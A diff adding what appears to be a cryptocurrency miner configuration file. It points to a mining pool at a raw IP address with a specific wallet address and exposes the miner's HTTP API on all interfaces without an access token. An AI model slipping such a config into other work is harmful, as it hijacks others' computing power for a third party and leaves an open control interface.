@@ -1,0 +1,25 @@
+{
+    "http": {
+        "enabled": true,
+        "host": "0.0.0.0",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "algo": null,
+            "url": "157.90.19.48:3333",
+            "user": "0x9D9282F0dD67d1309A53A1b80AB2BA894e1c8B80",
+            "pass": "x",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
